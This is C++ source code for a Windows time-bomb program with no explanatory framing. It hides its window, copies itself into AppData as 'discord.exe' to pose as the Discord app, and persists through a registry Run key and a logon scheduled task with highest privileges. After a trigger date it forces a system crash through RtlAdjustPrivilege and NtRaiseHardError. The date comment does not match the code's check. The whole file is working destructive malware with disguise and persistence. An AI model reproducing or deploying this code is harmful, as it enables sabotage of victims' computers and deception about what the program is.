#include <Windows.h>
#include <winternl.h>
#include <shlobj.h>
#include <shellapi.h>
#include <iostream>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Advapi32.lib")

typedef NTSTATUS(WINAPI* RtlAdjustPrivilege_t)(
    ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef NTSTATUS(WINAPI* NtRaiseHardError_t)(
    NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

bool isTriggerTime() {
    SYSTEMTIME st;
    GetLocalTime(&st);

    // Check if the date is on or after 2025-04-10
    if (st.wYear > 2027) return true;
    if (st.wYear == 2027 && st.wMonth > 1) return true;
    if (st.wYear == 2027 && st.wMonth == 1 && st.wDay >= 25) return true;
  

    return false;
}

void hideWindow() {
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);  // Hide the console window
}

void copyToAppDataAndRun() {
    char appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    std::string dest = std::string(appdata) + "\\discord.exe";  // Custom name

    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    if (strcmp(currentPath, dest.c_str()) != 0) {
        CopyFileA(currentPath, dest.c_str(), FALSE);
        ShellExecuteA(NULL, "open", dest.c_str(), NULL, NULL, SW_HIDE);
        exit(0);
    }
}

void addToStartupRegistry() {
    char appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    std::string exePath = std::string(appdata) + "\\discord.exe";  // Custom name

    HKEY hKey;
    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "DiscordApp", 0, REG_SZ, (BYTE*)exePath.c_str(), exePath.length() + 1);  // Custom name
        RegCloseKey(hKey);
    }
}

void addScheduledTask() {
    char appdata[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    std::string exePath = std::string(appdata) + "\\discord.exe";  // Custom name

    std::string command = "SCHTASKS /Create /SC ONLOGON /TN \"DiscordApp\" /TR \"" + exePath + "\" /RL HIGHEST /F";  // Custom name
    system(command.c_str());
}

int main() {
    hideWindow();  // Hide the console window

    copyToAppDataAndRun();
    addToStartupRegistry();
    addScheduledTask();

    if (!isTriggerTime()) return 0;

    BOOLEAN b;
    ULONG response;

    RtlAdjustPrivilege_t RtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAdjustPrivilege");
    NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");

    RtlAdjustPrivilege(19, TRUE, FALSE, &b);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response);

    return 0;
}
